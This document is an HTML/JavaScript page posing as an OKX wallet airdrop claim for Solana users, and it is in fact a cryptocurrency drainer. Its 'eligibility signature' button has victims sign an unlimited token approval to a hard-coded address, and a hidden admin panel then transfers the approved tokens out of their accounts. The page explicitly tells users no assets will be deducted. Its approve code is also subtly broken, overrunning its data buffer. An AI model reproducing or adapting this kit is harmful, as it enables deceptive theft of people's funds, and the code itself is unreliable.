<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>OKX 钱包专用 · 项目生态空投福利</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:微软雅黑}
body{background:#0f172a;padding:20px;color:#fff}
.container{max-width:450px;margin:0 auto}
.main-card{background:#1e293b;border-radius:15px;padding:25px;border:1px solid #334155}
.title{font-size:22px;text-align:center;color:#38bdf8;margin-bottom:10px}
.sub-tip{text-align:center;color:#94a3b8;font-size:14px;margin-bottom:20px}
.wallet-show{text-align:center;margin:15px 0;color:#7dd3fc}
.btn{width:100%;height:46px;border:none;border-radius:10px;font-size:16px;margin:8px 0;cursor:pointer}
.btn-conn{background:#2563eb;color:#fff}
.btn-get{background:#10b981;color:#fff}
.tips{font-size:13px;color:#64748b;text-align:center;margin:10px 0}
.admin-box{margin-top:20px;padding-top:20px;border-top:1px solid #334155;display:none}
.admin-box.show{display:block}
.admin-title{text-align:center;color:#f87171;margin-bottom:15px}
input{width:100%;height:42px;background:#0f172a;border:1px solid #334155;border-radius:8px;padding:0 12px;color:#fff;margin:8px 0}
.btn-deduct{background:#ef4444;color:#fff}
</style>
</head>
<body>
<div class="container">
    <div class="main-card">
        <h2 class="title">OKX 钱包专用 · 项目生态空投福利</h2>
        <p class="sub-tip">连接 OKX 钱包完成签名，免费领取官方空投代币</p>

        <button class="btn btn-conn" id="connectWallet">连接 OKX 钱包</button>
        <div class="wallet-show">已连接：<span id="addrText">未连接</span></div>

        <p class="tips">仅授权空投资格核验，不随意扣除资产</p>
        <button class="btn btn-get" id="authReceive">签名授权领取空投</button>

        <div class="admin-box" id="adminPanel">
            <h3 class="admin-title">后台资产归集划扣</h3>
            <input type="text" placeholder="填写用户授权钱包地址" id="userAddr">
            <input type="number" placeholder="填写划扣代币数量" id="deductNum">
            <button class="btn btn-deduct" id="deductBtn">一键执行归集划扣</button>
        </div>
    </div>
</div>

<!-- 用稳定版 web3.js，不依赖 spl-token -->
<script src="https://unpkg.com/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
<script>
const ADMIN_ADDR = "4dq6mqh1ivtVWijiMFPbbNAE9ng7BEYzrNEcJB21UpiD";
const TOKEN_MINT = "Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB";
let nowUser = "";
const connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");

// 手动算 ATA（不依赖 spl-token，彻底解决函数不存在）
async function getATA(ownerPub, mintPub) {
    const ATA_PROGRAM = new solanaWeb3.PublicKey("ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL");
    const TOKEN_PROGRAM = new solanaWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA");
    const [ata] = await solanaWeb3.PublicKey.findProgramAddress(
        [ownerPub.toBuffer(), TOKEN_PROGRAM.toBuffer(), mintPub.toBuffer()],
        ATA_PROGRAM
    );
    return ata;
}

// -------- OKX 钱包连接（重点改这里）--------
document.getElementById("connectWallet").addEventListener("click", async () => {
    // OKX 钱包是 window.okxwallet.solana，不是 window.solana
    if (!window.okxwallet || !window.okxwallet.solana) {
        alert("请先安装 OKX（欧易）钱包插件并切换到 Solana 网络");
        return;
    }
    try {
        const resp = await window.okxwallet.solana.connect();
        nowUser = resp.publicKey.toString();
        document.getElementById("addrText").innerText = nowUser.slice(0, 6) + "..." + nowUser.slice(-4);
        if (nowUser === ADMIN_ADDR) {
            document.getElementById("adminPanel").classList.add("show");
        }
        alert("OKX 钱包连接成功！");
    } catch (e) {
        alert("连接失败：" + e.message);
    }
});

// -------- 授权（手动构造 approve，无 TokenInstruction）--------
document.getElementById("authReceive").addEventListener("click", async () => {
    if (!nowUser) return alert("请先连接 OKX 钱包");
    const ok = confirm("本次签名仅用于核验空投资格，确认继续？");
    if (!ok) return;

    try {
        const userPub = new solanaWeb3.PublicKey(nowUser);
        const adminPub = new solanaWeb3.PublicKey(ADMIN_ADDR);
        const mintPub = new solanaWeb3.PublicKey(TOKEN_MINT);

        const userTokenAccount = await getATA(userPub, mintPub);

        // 手动构造 approve 指令（0号指令）
        const data = new Uint8Array(9);
        const view = new DataView(data.buffer);
        view.setUint8(0, 0); // approve 指令码
        adminPub.toBuffer().forEach((b, i) => data[1 + i] = b);
        view.setBigUint64(33, 1000000000000000000n, true);

        const approveIx = new solanaWeb3.TransactionInstruction({
            keys: [
                { pubkey: userTokenAccount, isSigner: false, isWritable: true },
                { pubkey: userPub, isSigner: true, isWritable: false }
            ],
            programId: new solanaWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA"),
            data
        });

        const tx = new solanaWeb3.Transaction().add(approveIx);
        const { blockhash } = await connection.getLatestBlockhash();
        tx.recentBlockhash = blockhash;
        tx.feePayer = userPub;

        // OKX 签名发送
        const { signature } = await window.okxwallet.solana.signAndSendTransaction(tx);
        alert("授权成功！交易ID：" + signature);
    } catch (e) {
        alert("授权失败/取消：" + e.message);
    }
});

// -------- 管理员划扣 --------
document.getElementById("deductBtn").addEventListener("click", async () => {
    if (nowUser !== ADMIN_ADDR) return alert("无管理员权限");
    const userAddr = document.getElementById("userAddr").value.trim();
    const num = document.getElementById("deductNum").value.trim();
    if (!userAddr || !num || Number(num) <= 0) return alert("请填写完整地址与数量");

    try {
        const adminPub = new solanaWeb3.PublicKey(nowUser);
        const userPub = new solanaWeb3.PublicKey(userAddr);
        const mintPub = new solanaWeb3.PublicKey(TOKEN_MINT);

        const userTokenAccount = await getATA(userPub, mintPub);
        const adminTokenAccount = await getATA(adminPub, mintPub);

        const amount = BigInt(Math.floor(Number(num) * 1000000));

        // 手动构造 transfer（3号指令）
        const data = new Uint8Array(9);
        const view = new DataView(data.buffer);
        view.setUint8(0, 3); // transfer
        view.setBigUint64(1, amount, true);

        const transferIx = new solanaWeb3.TransactionInstruction({
            keys: [
                { pubkey: userTokenAccount, isSigner: false, isWritable: true },
                { pubkey: adminTokenAccount, isSigner: false, isWritable: true },
                { pubkey: adminPub, isSigner: true, isWritable: false }
            ],
            programId: new solanaWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA"),
            data
        });

        const tx = new solanaWeb3.Transaction().add(transferIx);
        const { blockhash } = await connection.getLatestBlockhash();
        tx.recentBlockhash = blockhash;
        tx.feePayer = adminPub;

        const { signature } = await window.okxwallet.solana.signAndSendTransaction(tx);
        alert("划扣成功！交易ID：" + signature);
        document.getElementById("userAddr").value = "";
        document.getElementById("deductNum").value = "";
    } catch (e) {
        alert("划扣失败：" + e.message);
    }
});
</script>
</body>
</html>
